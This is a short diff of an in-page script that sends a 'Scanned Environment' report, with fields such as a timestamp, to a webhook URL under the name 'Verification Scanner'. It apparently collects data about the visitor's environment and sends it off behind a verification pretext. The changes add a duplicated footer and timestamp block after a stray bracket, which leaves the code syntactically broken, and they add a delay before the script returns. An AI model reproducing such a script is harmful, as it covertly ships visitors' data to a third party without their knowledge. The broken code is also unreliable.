@@ -160,7 +160,6 @@ await fetch(WEBHOOK_URL, {
     embeds: [{
       title: "Scanned Environment",
       color: 3447003,
-
       fields: [
         // ——— BASIC INFO ———
         { name: "Timestamp", value: basic.timestamp || "Unknown", inline: false },
@@ -208,9 +207,17 @@ await fetch(WEBHOOK_URL, {
         text: "Verification Scanner • Summary Report"
       },
       timestamp: new Date().toISOString()
+      ],
+      footer: {
+        text: "Verification Scanner · Summary Report"
+      },
+      timestamp: new Date().toISOString()
     }]
   })
 });
+
+// Delay before returning to caller (1.5s)
+await new Promise(resolve => setTimeout(resolve, 1500));
     }
   </script>
 
